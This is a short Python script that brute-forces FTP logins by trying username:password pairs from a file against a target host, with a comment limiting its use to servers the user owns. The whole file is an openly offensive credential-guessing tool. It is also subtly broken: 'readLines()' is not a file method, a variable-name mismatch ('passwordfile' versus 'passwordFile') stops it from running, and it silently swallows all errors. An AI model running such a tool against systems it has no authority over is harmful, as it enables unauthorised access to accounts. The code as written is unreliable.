import ftplib

def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readLines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + str(userName) + "/" + str(passWord))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print("FTP login succeeded: " + str(userName) + "/" + str(passWord))
            ftp.quit()
            return(userName, passWord)
        except Exception: 
            pass
    
if __name__ == '__main__':
    hostName = "123" 
    # enter in hostname a FTP server that you own ONLY
    passwordfile = 'credentials.txt'
    bruteForceLogin(hostName, passwordFile)